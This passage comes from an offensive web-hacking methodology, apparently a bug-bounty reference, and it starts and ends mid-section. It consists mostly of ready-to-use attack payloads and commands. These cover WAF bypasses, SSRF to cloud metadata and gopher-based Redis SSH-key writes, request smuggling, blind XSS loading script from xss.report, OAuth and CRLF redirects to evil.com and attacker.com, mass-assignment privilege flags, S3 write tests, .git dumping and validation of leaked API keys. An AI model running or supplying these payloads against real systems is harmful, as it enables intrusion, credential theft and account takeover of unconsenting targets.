UNION%0cSELECT          # Form feed
UNION%0bSELECT          # Vertical tab
UNION%A0SELECT          # Non-breaking space
```

### 4. HTTP Parameter Pollution (HPP)
```http
GET /search?id=1&id=2' UNION SELECT 1,2,3--
# PHP: last wins | ASP.NET: first wins | Node: array | Java: first wins
GET /admin?role=user&role=admin
```

### 5. HTTP Method Manipulation
```http
POST /api/delete-user
X-HTTP-Method-Override: DELETE

GeT /admin
Post /api/data
PROPFIND /admin
MKCOL /upload
TRACE /admin
```

### 6. Content-Type Confusion
```http
Content-Type: application/json
{"id":"1' OR '1'='1"}

Content-Type: application/xml
<id>1' OR '1'='1</id>
```

### 7. Body Padding / Size Bypass
WAFs have inspection size limits. Add junk data to push payload past window:
```http
{"junk": "AAAA...[128KB of junk]...", "id": "1' OR '1'='1"}
```
Tool: nowafplsV2 (Burp extension)

### 8. Chunked Transfer Encoding
```http
POST /api/search HTTP/1.1
Transfer-Encoding: chunked
4
1' O
6
R '1'
4
='1
8
' -- -
0
```

### 9. Request Smuggling
```http
# CL.TE smuggling
POST / HTTP/1.1
Content-Length: 44
Transfer-Encoding: chunked
0

GET /admin HTTP/1.1
X-Ignore: X
```

### 10. Protocol Downgrade
```bash
curl -s --http1.0 "https://target.com/?id=1' OR '1'='1"
```

### 11. Null Byte Injection
```http
?id=1' UNION SELECT 1,2,3%00-- -
../../../etc/passwd%00.jpg
```

### Vendor-Specific Bypasses

**Cloudflare**:
```html
<details open ontoggle=alert(1)>
<object onerror=alert(1)>
<image src=x onpointerover=alert(1)>
<textarea autofocus onfocus=alert(1)>
<body onafterprint=alert(1)>
```

**AWS WAF**:
```bash
?q=%2527%2520OR%25201%253D1--
?q=1'%E2%80%80OR%E2%80%801=1--  # Mongolian vowel separator
```

**Akamai**:
```html
<svg onload=alert(1)>
<isindex action=javascript:alert(1) type=image>
```

**ModSecurity / OWASP CRS**:
```bash
'SeLeCt 1,2,3 FrOm users WhErE 1=1--
javascript&#58;alert(1)
<scr%0Aipt>alert(1)</scr%0Aipt>
```

### Automated WAF Bypass Tools
```bash
# bypassburrito (Go, LLM-powered)
burrito bypass -u "https://target.com" --param id --type sqli
burrito bypass -u "https://target.com" --param q --type xss --waf-type cloudflare

# wafrift (Python, evolutionary engine)
wafrift scan --url "https://target.com/?id=1" --param id --payload "' OR '1'='1"

# evilwaf (Python, MITM proxy)
evilwaf --target https://target.com --proxy http://127.0.0.1:8080
```

### WAF Bypass Decision Tree
```
Is payload blocked?
├── Yes → Try URL encode
│   ├── Blocked → Try double URL
│   │   ├── Blocked → Try comment injection
│   │   │   ├── Blocked → Try whitespace tricks
│   │   │   │   ├── Blocked → Try HPP
│   │   │   │   │   ├── Blocked → Try chunked encoding
│   │   │   │   │   │   ├── Blocked → Try body padding
│   │   │   │   │   │   │   ├── Blocked → Try protocol downgrade
│   │   │   │   │   │   │   │   ├── Blocked → Try smuggled request
│   │   │   │   │   │   │   │   │   ├── Blocked → Use automated tools
│   │   │   │   │   │   │   │   │   │   └── Blocked → Find origin IP
```

### Origin IP Discovery (Complete WAF Bypass)
```bash
# Shodan
shodan search "hostname:target.com" --fields ip_str,port
shodan search "org:Target Company" --fields ip_str,port

# Historical DNS
dig target.com ANY

# Email headers — send to non-existent user, check Received: headers
# Subdomain DNS — find subdomain pointing directly to IP
# SSL certificate transparency — search for certs → extract IPs
# Tools: evilwaf (built-in hunter), wafw00f
```

---

## 16.6 ADVANCED SSRF EXPLOITATION

### Detection
```bash
# Standard URL parameters
curl -s "https://target.com/fetch?url=http://COLLABORATOR/test"
curl -s "https://target.com/proxy?url=http://COLLABORATOR/test"

# Headers
curl -s "https://target.com/" -H "X-Forwarded-For: COLLABORATOR"
curl -s "https://target.com/" -H "True-Client-IP: COLLABORATOR"
curl -s "https://target.com/" -H "Referer: http://COLLABORATOR/"
```

### SSRF Escalation Ladder

**Level 1: Confirm** — Collaborator callback

**Level 2: Internal Port Scanning**
```bash
http://127.0.0.1:22    # SSH
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:9200  # Elasticsearch
http://127.0.0.1:3000  # Node.js
http://127.0.0.1:8080  # Alternative HTTP
```

**Level 3: Cloud Metadata**
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Alibaba
http://100.100.100.200/latest/meta-data/
```

**Level 4: Internal Service Exploitation**
```bash
# Redis via Gopher — write SSH key to authorized_keys
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...

# Elasticsearch
http://127.0.0.1:9200/_search?q=password
```

**Level 5: Protocol Bypass Techniques**
```bash
# IPv6 loopback
http://[::1]:8080/
http://[::ffff:127.0.0.1]/

# Decimal IP
http://2130706433/       # 127.0.0.1
http://2852039166/       # 169.254.169.254

# DNS rebinding domains
http://169.254.169.254.nip.io/
http://1.0.0.127.nip.io/

# URL parser confusion
http://127.0.0.1:8080@evil.com/
http://evil.com\@127.0.0.1/
http://127.0.0.1%00evil.com/
```

### SSRF via PDF Generators
```html
<img src="http://169.254.169.254/latest/meta-data/"/>
<iframe src="http://127.0.0.1:8080/admin"/>
```

### SSRF Mitigation Bypass
| Mitigation | Bypass |
|-----------|--------|
| IP deny list | Decimal/hex/octal/IPv6 variants |
| Hostname allowlist | DNS rebinding, URL parser confusion |
| Protocol allowlist | gopher://, dict://, file:// |
| SSRF via DNS | TOCTOU via DNS rebinding |
| IMDSv1 blocked | IMDSv2: PUT /latest/api/token |

---

## 16.7 VULNERABILITY CHAINING METHODOLOGY

### Core Framework
```
[Entry Point] → [Weak Control] → [Adjacent System] → [Priv Esc] → [Business Impact] → [Critical]
```

### For every finding ask:
- **ENABLES**: Does this give access to something new?
- **AMPLIFIES**: Does this make another bug worse?
- **BYPASSES**: Does this bypass a security control?
- **CHAINS**: Does this trigger a secondary action?
- **ESCALATES**: Can I go from read to write, user to admin?

### Proven Chain Patterns

**Pattern 1: SSRF → Internal API → RCE** (Med+Low=Crit, $10K-$50K)
```bash
# Confirm SSRF
curl -s "https://target.com/fetch?url=http://collaborator.net/test"
# Probe internal services
curl -s "https://target.com/fetch?url=http://127.0.0.1:6379/"
# RCE via internal service
curl -s "https://target.com/fetch?url=gopher://127.0.0.1:6379/_..."
```

**Pattern 2: Auth Bypass → IDOR → Data Exfil** (Med+Med=Crit, $5K-$25K)
```bash
curl -s "https://internal-api.target.com/users" -H "Authorization: null"
for id in $(seq 1 1000); do
  curl -s "https://internal-api.target.com/users/$id/orders"
done
```

**Pattern 3: XSS → CSRF → Admin Action** (Med+Med=Crit, $3K-$15K)
```html
<script>
fetch('/admin/delete-user').then(r => r.text).then(html => {
  const token = html.match(/csrf_token=([^"']+)/)[1];
  fetch('/admin/delete-user', {method:'POST', body:'user_id=1&csrf_token='REDACTED_ASSIGNED_SECRET"include'});
});
</script>
```

**Pattern 4: Info Disclosure → Cred Reuse → ATO** (Low+Low=Crit, $5K-$20K)
```bash
curl -s "https://target.com/api/users/999999" | grep -oP '[a-zA-Z0-9._%+-]+@target.com'
git log -p --all | grep -i password
curl -s -X POST "https://target.com/api/login" -d 'email=admin@target.com&password=Welcome2023!'
```

**Pattern 5: Open Redirect → OAuth Token Theft → ATO** (Med+Med=Crit, $3K-$15K)
```
https://target.com/auth/callback?redirect_uri=https://evil.com/steal
```

**Pattern 6: GraphQL Introspection → Hidden Mutation → Priv Esc** (Med+Med=High, $2K-$10K)
```graphql
query { __schema { types { name fields { name } } } }
mutation { grantAdminRole(userId: "victim", role: "admin") { success } }
```

### Chain Scoring
| Component | Individual | Chained |
|-----------|-----------|---------|
| SSRF | 6.5 (Medium) | 9.8 (Critical) |
| IDOR | 5.3 (Medium) | 8.8 (High) |
| RCE via chain | — | 10.0 (Critical) |

### Reporting Chains
1. Title: `[Vuln1] + [Vuln2] → [Vuln3] = [Final Impact]`
2. Describe the path step by step
3. Show each step independently first, then the full chain
4. Quantify impact: "This chain lets attacker access $500K in assets"

---

## 16.8 GOOGLE API KEY HUNTING

### Why
Exposed Google API keys — Gemini ecosystem changed the game. A single leaked Gemini-enabled key = unauthorized AI service access with serious financial impact.

### Phase 1: GitHub Dorking
```bash
# Search for:
AIza[0-9A-Za-z_-]{35}  (Google API key format)
"AIza" + "gemini" / "gemini-2.0" / "generative-ai"
"GOOGLE_API_KEY" in .env, config files, JS bundles
```

### Phase 2: Key Verification
```bash
curl -s "https://generativelanguage.googleapis.com/v1beta/models?key=AIza..."
# Valid response = key has Gemini enabled
```

### Phase 3: Impact Demonstration
- Access Gemini API endpoints
- Show cost impact via pricing calculator
- Test referer-based bypasses (some keys restricted to domains)
- Move beyond "found a key" — show what it can DO

### Phase 4: Burp Extension
Automated in-browser discovery — intercept API keys during browsing, auto-check JS files, validate against Gemini.

### Phase 5: Automation (5 Modes)
1. Single domain: crawl → extract → validate
2. Multi-domain: sequential/parallel
3. Direct JS URL list: skip crawling
4. Raw key validation: accept list of keys + referer bypass
5. Validated with evidence: curl commands, responses, cost breakdown

### Phase 6: Beyond Gemini
- Google Cloud APIs (Storage, Compute, BigQuery)
- Each API has different validation endpoints
- Check if key is unrestricted vs restricted

### Key Commands
```bash
cat urls.txt | while read url; do curl -s "$url" | grep -oP 'AIza[0-9A-Za-z_-]{35}'; done

cat keys.txt | while read key; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://generativelanguage.googleapis.com/v1beta/models?key=$key")
  echo "$key: $status"
done

curl -s -H "Referer: https://allowed-domain.com" "https://generativelanguage.googleapis.com/v1beta/models?key=$key"
```

---

## 16.9 SQLMAP + GHAURI WAF BYPASS

### SQLmap
```bash
# ModSecurity bypass
sqlmap -u "https://target.com/page?id=1" --tamper=between,randomcase,space2comment --random-agent --delay=2

# Cloudflare bypass
sqlmap -u "https://target.com/page?id=1" --tamper=between,bluecoat,charencode,charunicodeencode --random-agent --delay=2 --flush-session

# Origin IP bypass (bypasses ALL WAF)
sqlmap -u "http://ORIGIN_IP/page?id=1" -H "Host: target.com"
```

### Ghauri (Next-Gen SQLi)
```bash
# Fortinet WAF bypass with junk data
ghauri -u "https://target.com/page?id=1" --junkdata --skip-urlencode

# Generic WAF
ghauri -u "https://target.com/page?id=1" --random-agent --delay=2 --skip-waf

# Terminate trailing query
ghauri -u "https://target.com/page?id=1" --terminate --skip-urlencode --confirm
```

### Ghauri vs SQLMap
| Technique | SQLmap | Ghauri |
|-----------|--------|--------|
| Between | --tamper=between | Built-in |
| Random Case | --tamper=randomcase | --random-agent |
| Space2Comment | --tamper=space2comment | Built-in |
| Junk Data Overload | No native support | --junkdata |
| Origin IP Bypass | Manual | Manual |

### Key Tips
- Always test with BOTH tools
- Origin IP bypass is most effective (bypasses ALL WAF)
- Junk data injection works especially well against Fortinet WAF
- WAF bypass is layered — try multiple techniques in combination

---

## 16.10 IIS HACKING METHODOLOGY

### Phase 1: Google Dorking
```bash
intitle:"IIS Windows Server" site:*.target.com
ext:ashx | ext:asmx site:target.com
```

### Phase 2: IIS Detection
```bash
httpx -l subs.txt -td -silent | grep Microsoft
```

### Phase 3: Shortname (Tilde) Enumeration
```bash
shortscanner -w iis_wordlist.txt https://target.com
# Reveals: WEB~1.CON → web.config, ADMIN~1.ASP → admin.aspx
```

### Phase 4: Shortname Resolution
- GitHub dorking for first 6 chars
- BigQuery GitHub dataset

### Phase 5: Precision Fuzzing
```bash
ffuf -u https://target.com/FUZZ -w iis-wordlist.txt \
  -e .asp,.aspx,.ashx,.asmx,.config,.zip,.bak \
  -mc 200,301,302,403 -fs 0
```

### High-Value IIS Endpoints
- `/web.config`, `/web.config.bak`
- `/trace.axd` — ASP.NET trace viewer
- `/elmah.axd` — error log viewer
- `/connectionstrings.config`
- `/WS_FTP.LOG`

### Key Takeaways
1. Start with Shodan/Google dorks to find IIS
2. Use shortscan on all Microsoft IIS targets
3. Resolve shortnames via BigQuery GitHub dataset
4. Fuzz: trace.axd, elmah.axd, web.config variants
5. IIS servers are notoriously misconfigured

---

## 16.11 REACT2SHELL — CVE-2025-55182 RCE

### What
CVSS 10.0 — Unauthenticated RCE in React Server Components (RSC). Affects React 19.0.0-19.2.0, Next.js App Router, Vite.

### Discovery
```bash
# Shodan
http.body:"react.production.min.js" || app:"React.js"
# FOFA
app="NEXT.JS" || app="React"

# CT logs for fresh targets
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | \
  httpx -silent -td | grep -i "react\|next"
```

### Detection
```bash
curl -s -X POST "https://target.com/_next/data/..." -H "Content-Type: text/plain"
curl -s -X POST "https://target.com/api/..." -H "Content-Type: text/plain"
```

### WAF Bypass for React2Shell
- Multipart/form-data encoding
- Chunked transfer encoding
- Payload splitting across chunks
- Unicode/encoding transformations

### Impact
- Execute arbitrary JS on server
- Access env vars (DB creds, API keys)
- Full infrastructure compromise in cloud

---

## 16.12 SPRING BOOT ACTUATOR EXPLOITATION

### Complete Endpoint List
```bash
/actuator                    # Index
/actuator/health             # Health
/actuator/info               # App info
/actuator/env                # ENV PROPERTIES (SECRETS!)
/actuator/configprops        # Config properties
/actuator/beans              # All Spring beans
/actuator/mappings           # API structure
/actuator/metrics            # Metrics
/actuator/loggers            # Logger config
/actuator/threaddump         # Thread dump
/actuator/heapdump           # HEAP DUMP (CREDENTIAL GOLDMINE!)
/actuator/jolokia            # JMX MBeans (RCE!)
/actuator/httptrace          # HTTP traces
/actuator/sessions           # Active sessions
/actuator/shutdown           # Shutdown app
/actuator/restart            # Restart app
/actuator/prometheus         # Metrics
```

### Discovery
```bash
nuclei -t exposures/configs/springboot-actuator.yaml -l targets.txt
httpx -l targets.txt -path /actuator -silent -mc 200,401,403
ffuf -w paths.txt -u https://target.com/FUZZ -mc 200,401,403
```

### Non-Standard Paths
```bash
/actuator, /management, /admin/actuator, /internal/actuator
/api/actuator, /spring/actuator, /actuator-1.0
```

### Access Control Bypass
```bash
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/actuator/env
curl -H "X-Original-URL: /actuator/env" https://target.com/
curl -H "X-Rewrite-URL: /actuator/env" https://target.com/
curl https://target.com/actuator/env;.js
curl https://target.com/actuator/env%00
curl https://target.com/actuator/..;/env
```

### Heapdump Analysis
```bash
wget https://target.com/actuator/heapdump
strings heapdump | grep -i "AKIA\|password\|secret\|jdbc:"
jhat heapdump
```

### Env Endpoint Secrets
```bash
curl https://target.com/actuator/env
curl https://target.com/actuator/env/spring.datasource.password
```

### Spring Boot 1.x Endpoints (no /actuator prefix)
```bash
/env, /health, /info, /dump, /trace, /jolokia, /beans, /configprops
```

### Key Takeaways
1. Even 401/403 confirms endpoint EXISTS
2. /heapdump and /env are highest-impact
3. Header-based bypass works often
4. Jolokia can lead to full RCE via JMX
5. Never assume WAF blocking = no actuator present

---

## 16.13 AUTH & SESSION TESTING

### Complete Checklist
1. **Old session persists after password change** — change password, old session still works?
2. **Failure to invalidate on logout** — reuse old token after logout?
3. **Browser cache weakness** — back button after logout exposes data?
4. **Email verification bypass** — unverified email, full access?
5. **Password reset token persistence** — old token still valid after new request?
6. **Password reset token reuse** — same token multiple times?
7. **Lack of session validation on sensitive endpoints** — no session needed?
8. **Session fixation** — set session before login, same ID after?
9. **Concurrent session limit bypass** — unlimited sessions?
10. **Missing session rotation after privilege change** — old session carries new privs?
11. **Unrestricted session duration** — tokens never expire?
12. **Weak "Remember Me"** — predictable persistent tokens?
13. **JWT Misconfigurations**:
```bash
# None algorithm: change alg to "none"
# Weak HMAC secret: crack weak signing key
# Expiration bypass: modify exp claim
# Kid injection: path traversal on key ID
# JWK header injection: embed own public key
```

---

## 16.14 MASS ASSIGNMENT PAYLOADS

### Boolean / Admin Flag
```json
{"isAdmin":true,"is_admin":true,"admin":true,"administrator":true}
{"isAdmin":1,"is_admin":"yes"}
```

### Role / Privilege
```json
{"role":"admin","role_id":1,"role_name":"Administrator"}
{"user_type":"admin","account_type":"premium"}
{"permissions":"*","access_level":9999}
{"groups":["administrators","superusers"]}
```

### Organization / Tenant
```json
{"org":"admin","org_id":1,"organization":"admin"}
{"tenant":"admin","tenant_id":1}
```

### Nested / Prototype
```json
{"profile":{"isAdmin":true,"role":"admin"}}
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

### Verification Manipulation
```json
{"email_verified":true,"isVerified":true}
{"email_verified_at":"2025-01-01T00:00:00Z","status":"active"}
{"skip_verification":true,"bypass_onboarding":true}
```

### Encoding Tricks
```json
{"\u0069sAdmin":true}
{"is\x00Admin":true}
```

### Combination (High-Value)
```json
{"isAdmin":true,"role":"admin","email_verified":true,"skip_verification":true,"bypass_onboarding":true}
```

### Testing Strategy
1. Start with simple boolean/admin flags
2. Try all casing/alias variants
3. Test nested JSON structures
4. Try prototype pollution
5. Check encoding bypasses
6. Combine multiple fields
7. Test on signup AND profile update endpoints

---

## 16.15 REGISTRATION BUGS — 22-Item Checklist

1. **Duplicate Registration & Account Overwrite** — Register with existing email, does it overwrite?
2. **Case Sensitivity / Shadow Account** — admin@ vs Admin@ = two accounts?
3. **DoS via Large Input Fields** — Extremely long strings crash it?
4. **Missing Rate Limiting** — 1000+ requests from single IP?
5. **Stored XSS** — `<script>alert(1)</script>` in profile fields?
6. **Insufficient Email Verification** — Access features without verifying?
7. **HTTP / Temp Emails** — Over HTTP? Accepts @tempmail.com?
8. **Weak Password Policies** — "123" or "password" allowed?
9. **Path Overwrite / Route Collision** — /api/register/admin works?
10. **Server-Side Validation Bypass** — Disable JS, modify HTML attributes?
11. **Hidden / Legacy Endpoints** — /api/v1/register, /signup-legacy?
12. **HTTP Parameter Pollution** — `?email=attacker@e.com&email=victim@t.com`?
13. **Weak Verification Links** — Sequential/guessable tokens?
14. **Punycode / IDN Homograph** — `xn--e1aybc@example.com` bypasses blocklists?
15. **OTP Brute-Force** — 4-digit OTP, no rate limit?
16. **Weak Session Tokens** — Predictable after registration?
17. **Null Byte Injection** — `admin%00@evil.com` truncates?
18. **Missing Email Confirmation Enforcement** — Paid features without confirm?
19. **Session Fixation** — Same session ID before and after?
20. **Cache Control Issues** — Back button after signup exposes data?
21. **Cross-Account IDOR** — Modify user_id in API calls after signup?
22. **Mass Assignment** — See mass assignment payloads above

---

## 16.16 BLIND XSS

### What
Payloads stored in places you cant see (admin panels, email templates, logs, chat systems). Fires later when backend renders them.

### Injection Vectors
- Comment/review systems
- Chat/messaging platforms
- Support ticket systems
- Contact forms
- Profile fields (name, bio, website)
- File upload EXIF/metadata
- HTTP headers (User-Agent, X-Forwarded-For)
- Email templates

### Tools
```bash
# XSSHunter (free: bxsshunter.com)
# Burp Collaborator (Burp Pro)
# interactsh (ProjectDiscovery, self-hosted)
# xss.report (Community)
```

### Burp Match & Replace (Automated)
Replace User-Agent header with payload — every request carries blind XSS payload.

### Automation
```bash
cat urls.txt | bxss -payload '"><script src=https://xss.report/c/Community></script>' -header "X-Forwarded-For"
cat urls.txt | gf xss | uro | dalfox pipe --blind https://collaborator --waf-bypass --silence
subfinder -d target.com | gau | bxss -appendMode -payload '"><script src=https://xss.report/c/Community></script>' -parameters
```

### EXIF/XSS via Image Metadata
```bash
exiftool -Comment='"><script src=https://xss.report/c/Community></script>' image.jpg
```

### Where to Inject Headers
User-Agent, X-Forwarded-For, Referer, X-Forwarded-Host, Cookie

### WAF Bypass for Blind XSS
- Double/triple URL encoding
- HTML entity encoding
- Split across multiple fields
- SVG/iframe vectors instead of `<script>`
- String.fromCharCode obfuscation
- atob base64

### Reporting Tips
- Include screenshot of blind XSS callback dashboard
- Show what admin panel exposes
- Chain with other vulns for max severity

---

## 16.17 WEB CACHE DECEPTION

### How it Works
1. Request sensitive endpoint: `/account/settings` — not cached
2. Add static extension: `/account/settings;.js`
3. Cache sees .js and caches the response
4. Unauthenticated attacker requests cached URL → gets victims data

### Detection
```bash
# Delimiters
/account/settings;.js
/account/settings;.css
/account/settings;.ttf
/account/settings/..%2fprofile
/account/settings?.js

# 2-request validation
curl -sD - "https://target.com/account/settings;.js" -o /dev/null
sleep 2
curl -sD - "https://target.com/account/settings;.js" -o /dev/null
# Second response has shorter age or HIT = cache working
```

### Mass Hunting
```bash
gau target.com | grep -E "(account|profile|dashboard|admin|settings|billing)" | \
  sed 's/$/;.js/' | httpx -silent -mc 200 | nuclei -dast
```

### Payload Delimiters
```
;.js  ;.css  ;.png  ;.jpg  ;.svg  ;.ttf  ;.woff
/..%2fprofile  /..%2f..%2faccount  ?.js  ?#.js
/%2e.js  %3B.js
```

---

## 16.18 PUNYCODE IDN — 0-CLICK ATO

### What
Use Cyrillic lookalikes (visually identical to Latin) to create spoofed emails.
Latin "a" (U+0061) vs Cyrillic "а" (U+0430) — visually identical, different Unicode.

### Attack Vectors

**1. Email Registration with Punycode:**
1. Generate punycode email: `vіctіm@tаrgеt.com` (Cyrillic lookalikes)
2. Intercept in Burp, replace email with punycode version
3. Register — if server doesnt normalize, you get verified access as victim

**2. Password Reset via Punycode:**
1. Request reset for "victim@target.com"
2. Intercept, change email to punycode version
3. Reset link sent to punycode email (attacker controls)
4. Use link to change victims password
5. **Zero-click ATO** — victim never notified

### Cyrillic Lookalikes
```
а→Cyrillic а(U+0430)  е→Cyrillic е(U+0435)  о→Cyrillic о(U+043E)
р→Cyrillic р(U+0440)  с→Cyrillic с(U+0441)  х→Cyrillic х(U+0445)
```

### Where to Test
- Magic link login systems
- Invite-by-email flows
- OAuth login whitelisting
- Forgot password / email change
- SSO/SAML trust domains
- Email-based 2FA bypass

---

## 16.19 S3 BUCKET RECON

### URL Formats
```
https://[bucket-name].s3.amazonaws.com
https://[bucket-name].s3-[region].amazonaws.com
```

### Discovery Methods

**Google Dorking:**
```bash
site:s3.amazonaws.com "target.com"
site:s3.amazonaws.com filetype:xls password target.com
```

**JS Extraction:**
```bash
gospider -d 3 -s https://target.com | grep -Eo 'https?://[^"<> ]+\.s3\.amazonaws\.com[^"<> ]*' | sort -u
```

**Brute-Forcing:**
```bash
lazys3 target.com  # Tests permutations: target-dev, target-backup, etc.
cewl -d 3 https://target.com | s3scanner -o buckets.txt
```

### Permission Testing
```bash
aws s3 ls s3://bucket-name --no-sign-request                          # List
aws s3 cp s3://bucket-name/file.txt . --no-sign-request               # Read
echo "test" | aws s3 cp - s3://bucket-name/poc.txt --no-sign-request   # Write
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request
aws s3api get-bucket-policy --bucket bucket-name --no-sign-request
```

### Exploitation
- List all files for sensitive data
- Upload malicious files (phishing, JS backdoors)
- Modify existing files with malicious versions
- Delete (DoS)

---

## 16.20 SWAGGER UI — XSS & HTML INJECTION

### Vulnerability Classes

**DOM XSS via configUrl:**
```bash
https://target.com/swagger?configUrl=https://attacker.com/malicious.json
https://target.com/swagger?url=https://attacker.com/openapi.yaml
```

**HTML Injection:** Fake login forms under legitimate domain

**Open Redirect via OAuth2:** Supply crafted authorizationUrl → click Authorize redirects to attacker

### Testing Payloads (from swagger)
```bash
?configUrl=https://raw.githubusercontent.com/swagger/main/xsstest.json
?configUrl=https://raw.githubusercontent.com/swagger/main/xsscookie.json
?configUrl=https://raw.githubusercontent.com/swagger/main/login.json
?configUrl=https://raw.githubusercontent.com/swagger/main/rlogin.json
```

### Discovery
```bash
httpx -l subs.txt -path /swagger -silent -mc 200
httpx -l subs.txt -path /swagger-ui -silent -mc 200
httpx -l subs.txt -path /api-docs -silent -mc 200
ffuf -w swagger_paths.txt -u https://target.com/FUZZ -mc 200 -fs 0
```

### Detection (page source)
- `SwaggerUIBundle`
- `swagger-ui.css`
- Title contains "Swagger UI"

### Impact Escalation
1. HTML injection → fake login → credential harvesting
2. Open redirect → phishing chain
3. DOM XSS → session theft → ATO
4. Resource injection → malware delivery

---

## 16.21 GITHUB RECON & .GIT EXPOSURE

### GitHub Dorking
```bash
filename:.env, filename:.env.production, filename:credentials.json
"target.com" "password"
"target.com" "api_key"
"target.com" "ghp_"  (GitHub tokens)
"target.com" "sk-"   (Stripe keys)
"target.com" "AIza"  (Google API keys)
"target.com" "AKIA"  (AWS access keys)
```

### .git Detection
```bash
curl -s -o /dev/null -w "%{http_code}" https://target.com/.git/config
httpx-toolkit -l subs.txt -path /.git/ -mc 200
cat domains.txt | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -ms "Index of"
```

### 403 is NOT a Dead End
```bash
curl https://target.com/.git/HEAD
curl https://target.com/.git/config
curl https://target.com/.git/logs/HEAD
```

### Git Dumper
```bash
git-dumper https://target.com/.git/ /tmp/target-dump
cd /tmp/target-dump
git log --oneline
git diff HEAD~1
grep -r "password\|secret\|api_key\|token\|AKIA\|sk-\|AIza" .
cat .env
```

### What to Look For After Dump
- .env files — DB credentials, API keys
- Config/ directories — service configs
- dump.sql / backup.sql — database dumps
- Old commits where secrets were "removed" (still in history)

---

## 16.22 ORIGIN IP DISCOVERY — 11+ Methods

### Why
Most effective WAF bypass: attack origin server directly. All WAF rules irrelevant.

### Method 1: Historical DNS (SecurityTrails)
```bash
https://securitytrails.com/domain/target.com/dns
# Find IPs used BEFORE WAF was deployed
```

### Method 2: Shodan
```bash
shodan search "ssl.cert.subject.CN:target.com" --fields ip_str,port,org
shodan search "ssl:target.com"
```

### Method 3: Censys
Search for certificates → click "Explore" → "IPv4 Hosts". SAN fields more reliable than CN.

### Method 4: FOFA
Search by domain, filter by favicon hash.

### Method 5: ViewDNS.info
```bash
https://viewdns.info/iphistory/?domain=target.com
```

### Method 6: SPF Records
```bash
dig txt target.com | grep "v=spf1"
```

### Method 7: VirusTotal
```bash
https://www.virustotal.com/gui/domain/target.com/relations
```

### Method 8: AlienVault OTX
```bash
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/passive_dns"
```

### Method 9: Subdomain Enumeration
Subdomains not behind WAF: dev, stage, origin, mail, direct, admin, api
```bash
subfinder -d target.com | httpx -silent -ip | grep -v "cloudflare\|akamai\|fastly"
```

### Method 10: Email Headers
Send email to non-existent address at target.com — inspect SMTP headers:
- Return-Path header
- Received header chain
- X-Originating-IP header

### Validation
```bash
curl -k -H "Host: target.com" https://CANDIDATE_IP/
curl -k -H "Host: target.com" https://CANDIDATE_IP/ -I
# Compare: title, server header, response body hash
```

### Tools
```bash
python3 evilwaf.py -t https://target.com --auto-hunt
python3 cloudflair.py target.com
```

### Key Tips
- SAN fields more reliable than CN
- Historical DNS most reliable (pre-WAF IPs)
- Always verify with Host header forging
- 403 ≠ wrong IP — means found something, need more headers

---

## 16.23 CT LOG MONITORING

### Why
Every SSL cert must be logged in public CT log. Discover subdomains minutes after cert issuance.

### Crtmon — Real-Time Monitoring
```bash
crtmon -d target.com
# Gets alerted as soon as new subdomains are issued
```

### Manual Queries
```bash
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | \
  jq -r '.[].dns_names[]' | sort -u
```

### Organization Name Pivoting
Query by organization name (O= field in cert subject) — catches new acquisitions, internal portals, beta products.

### Automation Pipeline
```bash
while true; do
  curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > new_subs.txt
  comm -23 new_subs.txt previous_subs.txt > fresh_subs.txt
  httpx -l fresh_subs.txt -silent | nuclei -t cves/ -t exposures/
  mv new_subs.txt previous_subs.txt
  sleep 3600
done
```

---

## 16.24 CRLF INJECTION

### What
Carriage Return + Line Feed (`%0d%0a`) injection splits HTTP response, allowing request smuggling, XSS, cache poisoning, log injection.

### Common Injection Points
Parameters: redirect, url, next, return, page
Headers: Location, Set-Cookie, X-Forwarded-For, Referer

### Testing Payloads
```
%0d%0a
%0d%0aInjected-Header: true
%0d%0a%0d%0a<html><script>alert(1)</script></html>
%0d%0aSet-Cookie: stolen_session=abc123; domain=.target.com
%0d%0aLocation: https://evil.com
```

### Discovery
```bash
# Loxs tool (loxs)
loxs -l urls.txt -crlf

# Manual
curl -s -I "https://target.com/page?param=test%0d%0aX-Injected:%20true"

# GF patterns
cat urls.txt | gf redirect | qsreplace "%0d%0aX-Injected:true" | httpx -silent -H "X-Injected" -mc 200
```

### Impact Scenarios
1. XSS via header injection
2. Session fixation via Set-Cookie
3. Cache poisoning
4. Log injection
5. Request smuggling
6. WAF bypass (split payload across lines)

---

# PART 17: SKILLS

## Bug Bounty Skill

### Recon
1. Subdomain enumeration: dig, sublist3r, crt.sh, CT
2. DNS analysis: leaks, zone transfers, CNAME
3. Tech fingerprinting: Wappalyzer, curl headers, error pages
4. Scope verification
5. JS bundle extraction

### Attack Surface Mapping
1. API discovery: /api, /v1, /v2, /graphql, /swagger
2. Endpoint enum: /actuator, /.env, /.git, /admin
3. Auth analysis: JWT, OAuth, API keys
4. CORS testing
5. Subdomain takeover

### Vulnerability Discovery
1. Info disclosure
2. Auth bypass
3. SSRF
4. CORS
5. Rate limiting

---

## DNS Recon Skill

### Subdomain Discovery
```bash
curl -sk "https://crt.sh/?q=%25.target.com&output=json"
for sub in dev staging api admin portal jenkins; do
  dig +short A "$sub.target.com"
  dig +short CNAME "$sub.target.com"
done
```

### DNS Leak Detection
- Look for RFC1918 private IPs in public DNS
- Common: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
- Check staging/dev/uat/internal subdomains

### Infrastructure Mapping
- NS records → DNS provider
- MX records → email provider
- TXT records → SPF, DKIM, verification tokens
- CNAME records → cloud services (CloudFront, S3, GCS, ALB)

---

## JS Analysis Skill

### Extraction
